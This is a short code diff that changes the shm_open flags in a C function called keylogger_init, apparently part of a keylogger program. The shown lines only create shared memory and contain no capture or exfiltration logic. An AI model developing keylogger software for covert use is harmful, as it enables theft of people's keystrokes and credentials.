@@ -120,7 +120,7 @@ int keylogger_init()
 	 * Create the shared memory. It's created in keylogger_init, so if we try to
 	 * change the flags with other function it won't work because the flags don't exist
 	 */
-	int fd_shm = shm_open(SHM_KEYLOGGER, O_RDWR | O_CREAT | O_EXCL, S_IRUSR | S_IWUSR);
+	int fd_shm = shm_open(SHM_KEYLOGGER, O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);
 	if (fd_shm == -1)
 	{
 		DEBUG_PRINT((P_ERROR " [KEYLOGGER] Error creating the shared memory\n"));
